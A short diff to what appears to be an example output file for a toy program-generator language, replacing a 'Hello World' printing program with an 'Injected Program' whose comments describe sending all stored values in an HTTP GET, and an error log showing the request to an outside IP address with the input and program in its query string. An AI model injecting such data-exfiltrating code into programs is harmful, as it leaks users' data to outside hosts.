@@ -1,22 +1,18 @@
-Input was:
+Original Input was:
 Hello World
 
 
-Auto-Generated Program Was:
-r!: :
-g: :
-t!:
+Injected Program Was:
+
+n!:1000 | v:id #random id
+p!:10 | v:data #random data
+n!:256:0:4:. | v:ip #random ip address
+v:vPROTOCOL:{http://}
+x*:vPROTOCOL | v:url #target web endpoint
+w*: #make HTTP GET with all vaults!
+v:vOUT #store output/results
+
 
 
 Output Was:
-Hello World
-Hello Worl
-Hello Wor
-Hello Wo
-Hello W
-Hello
-Hello
-Hell
-Hel
-He
-H
+[ERROR]: NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'http://50.183.200.135/?vIN=Hello+World&vCMD=%0An%21%3A1000+%7C+v%3Aid+%23random+id%0Ap%21%3A10+%7C+v%3Adata+%23random+data%0An%21%3A256%3A0%3A4%3A.+%7C+v%3Aip+%23random+ip+address%0Av%3AvPROTOCOL%3A%7Bhttp%3A%2F%2F%7D%0Ax*%3AvPROTOCOL+%7C+v%3Aurl+%23target+web+endpoint%0Aw*%3A+%23make+HTTP+GET+with+all+vaults%21%0Av%3AvOUT+%23store+output%2Fresults%0A&id=642&data=vgisdhgmya&ip=50.183.200.135&vPROTOCOL=http%3A%2F%2F&url=http%3A%2F%2F50.183.200.135'.
